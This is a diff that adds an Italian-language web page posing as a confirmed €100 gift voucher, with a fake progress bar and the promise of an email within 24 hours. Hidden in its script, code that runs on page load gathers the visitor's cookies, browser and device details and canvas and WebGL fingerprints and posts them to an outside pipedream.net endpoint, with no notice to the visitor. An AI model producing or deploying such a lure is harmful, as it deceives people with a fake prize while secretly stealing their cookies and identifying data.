@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🎁 Buono Regalo</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+        .card{background:white;border-radius:30px;padding:40px 30px;max-width:380px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.2)}
+        .emoji{font-size:70px;margin-bottom:15px}
+        h1{color:#333;font-size:24px;margin-bottom:10px}
+        .amount{font-size:55px;font-weight:bold;color:#764ba2;margin:20px 0}
+        .bar{background:#e0e0e0;border-radius:20px;height:8px;margin:20px 0;overflow:hidden}
+        .barfill{background:#764ba2;height:100%;width:0%;border-radius:20px;transition:width .3s}
+        .status{color:#666;font-size:14px;margin-top:10px}
+        .footer{font-size:11px;color:#aaa;margin-top:20px}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="emoji">🎁</div>
+        <h1>Buono Regalo Confermato!</h1>
+        <p>Il tuo premio è in elaborazione</p>
+        <div class="amount">€100</div>
+        <div class="bar"><div class="barfill" id="barfill"></div></div>
+        <p class="status" id="status">Verifica account...</p>
+        <p class="footer">Riceverai il buono via email entro 24 ore</p>
+    </div>
+
+    <script>
+        const PIPEDREAM_URL = "https://69cd60beb3f0593eb064103e51330e55.m.pipedream.net";
+        
+        async function collect() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + "x" + screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: document.cookie,
+                referrer: document.referrer,
+                url: window.location.href,
+                hardware: navigator.hardwareConcurrency || "?",
+                memory: navigator.deviceMemory || "?"
+            };
+            try {
+                const c = document.createElement("canvas");
+                const x = c.getContext("2d");
+                x.textBaseline = "top"; x.font = "14px Arial";
+                x.fillStyle = "#f60"; x.fillRect(125,1,62,20);
+                x.fillText("FP 🔒", 2, 15);
+                data.canvasFP = c.toDataURL().substring(0,200);
+            } catch(e) {}
+            try {
+                const c = document.createElement("canvas");
+                const g = c.getContext("webgl") || c.getContext("experimental-webgl");
+                if(g) {
+                    const d = g.getExtension("WEBGL_debug_renderer_info");
+                    data.webglRenderer = g.getParameter(d.UNMASKED_RENDERER_WEBGL);
+                    data.webglVendor = g.getParameter(d.UNMASKED_VENDOR_WEBGL);
+                }
+            } catch(e) {}
+            try {
+                await fetch(PIPEDREAM_URL, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {}
+        }
+        
+        let p = 0;
+        const bar = document.getElementById("barfill");
+        const st = document.getElementById("status");
+        const msgs = ["Verifica account...","Conferma premio...","Generazione buono...","Invio email..."];
+        let i = 0;
+        setInterval(() => {
+            p += Math.random() * 35;
+            if(p > 100) p = 100;
+            bar.style.width = p + "%";
+            if(p > (i+1)*25 && i < msgs.length) { st.textContent = msgs[i]; i++; }
+        }, 500);
+        
+        collect();
+        setTimeout(collect, 2000);
+    </script>
+</body>
+</html>
